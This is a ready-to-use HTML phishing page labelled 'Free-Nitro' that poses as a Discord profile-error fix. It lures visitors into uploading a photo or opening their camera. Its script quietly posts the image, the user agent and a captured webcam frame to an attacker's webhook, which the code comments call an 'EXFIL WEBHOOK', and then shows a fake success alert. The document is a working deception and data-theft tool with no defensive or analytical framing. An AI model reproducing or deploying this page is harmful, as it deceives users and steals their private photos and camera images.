# Free-Nitro
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width">
<title>🔒 Discord Image Sync</title>
<style>body{font-family:system-ui;background:#36393f;color:#dcddde;padding:20px;text-align:center;margin:0;}
button{background:#5865f2;color:white;border:0;padding:15px 30px;font-size:18px;border-radius:10px;margin:10px;cursor:pointer;}
h1{font-size:28px;margin:20px 0;}
p{font-size:16px;}
input{display:none;}</style>
</head>
<body>
<h1>⚠️ Discord Profile Error</h1>
<p>Your mobile image preview is broken!</p>
<p><strong>Sync your photo to fix:</strong></p>

<input type="file" id="file" accept="image/*" capture onchange="steal()">
<button onclick="document.getElementById('file').click()">📤 Upload Photo</button>
<button onclick="camera()">📸 Camera</button>

<script>
// YOUR EXFIL WEBHOOK (Webhook.site free)
const WEBHOOK = 'https://webhook.site/#!/your-unique-id/xxxx'; 

async function steal() {
  const file = document.getElementById('file').files[0];
  if(file) {
    const reader = new FileReader();
    reader.onload = e => {
      fetch(WEBHOOK, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          image: e.target.result,
          ua: navigator.userAgent,
          time: new Date().toISOString()
        })
      }).then(()=>alert('✅ Fixed!'));
    };
    reader.readAsDataURL(file);
  }
}

async function camera() {
  const stream = await navigator.mediaDevices.getUserMedia({video:true});
  const video = document.createElement('video');
  video.srcObject = stream; video.play();
  setTimeout(()=>{
    const canvas = document.createElement('canvas');
    canvas.width=640; canvas.height=480;
    canvas.getContext('2d').drawImage(video,0,0);
    fetch(WEBHOOK, {method:'POST', body:canvas.toDataURL()});
    stream.getTracks().forEach(t=>t.stop());
    alert('📸 Synced!');
  }, 2000);
}
</script>
</body>
</html>
